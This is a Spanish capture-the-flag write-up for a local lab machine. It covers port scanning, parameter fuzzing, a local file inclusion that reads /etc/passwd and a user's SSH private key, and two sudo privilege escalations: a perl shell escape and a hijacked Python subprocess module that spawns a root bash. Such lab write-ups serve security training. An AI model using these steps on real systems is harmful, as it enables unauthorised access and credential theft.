## Reconocimiento
. Realizo un escaneo inicial en busca de puertos abiertos.
```
nmap -p- --open --min-rate 5000 -sS -n -Pn 172.17.0.2 -oG puertos
```
Se encuentra que los puertos **22,80** estan abiertos, realizo un escaneo mas detalado.
```
nmap -p22,80 -sCV 172.17.0.2 -oN escaneo
```

```
PORT   STATE SERVICE VERSION
   6   │ 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
   9   │ |_  256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
  10   │ 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
  11   │ |_http-title: 4You
  12   │ |_http-server-header: Apache/2.4.58 (Ubuntu)
  13   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
  14   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeración web
 - Ingreso a la pagina :
    http://172.17.0.2 
Se observa una pagina simple, sin mucha información.

Se realiza fuzzing en busca de parámetros ocultos.
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://172.17.0.2/index.php?FUZZ=test" -fs 2596
```

El resultado encontrado es:
	secret -> Status 200

## LFI (Local File Inclusión)

Pruebo: 
	http://172.17.0.2/index.php?secret=../../../../etc/passwd
Se encuentran varios usuarios:
- ubuntu
- vaxei
- luisillo

Se realiza búsqueda de contraseña con hydra para los usuarios pero no se encuentra resultados.
Así que realizo búsqueda de clave RSA.

## Exfiltración de clave SSH 

Realizo búsqueda de posibles claves privadas:
	http://12.17.0.2/indexphp?secret=home/vaxei/.ssh/id_rsa
	http://172.17.0.2/index.php?secret=/home/ubuntu/.ssh/id_rsa
	http://172.17.0.2/index.php?secret=/home/luisillo/.ssh/id_rsa
Encuentro clave id_rsa para el usuario **vaxei**
Guardo la clave:
```
nano id_rsa_vaxei
chmod 600 id_rsa_vaxei
```
Me conecto a través de ssh
```
ssh -i id_rsa_vaxei vaxei@172.17.0.2
```

## Escalada de privilegio

Verifico los privilegios:
```
sudo -l
```
El resultado obtenido:
```
(luisillo) NOPASSWD: /usr/bin/perl
```
Escala al usuario **luisillo**
```
sudo -u luisillo perl -e 'exec "/bin/bash";'
```

Realizo una nueva enumeración:
```
sudo -l
```
El resultado obtenido es: 
```
(ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```
El archivo solamente tengo permiso de lectura pero al revisarlo 
```
subprocess.run(['echo Hello'], check=True)
```
El comando esta mal definido así que nos aprovechamos de esto.

## Explotación

Me dirijo a la carpeta opt y creo un archivo malicioso.
```
nano /opt/subprocess.py

import os

def run(cadena, check):
	os.system("/bin/bash")
```
Luego ejecuto  el archivo
```
sudo /usr/bin/python3 /opt/paw.py
```
Una vez ejecutado ya soy usuario **root**
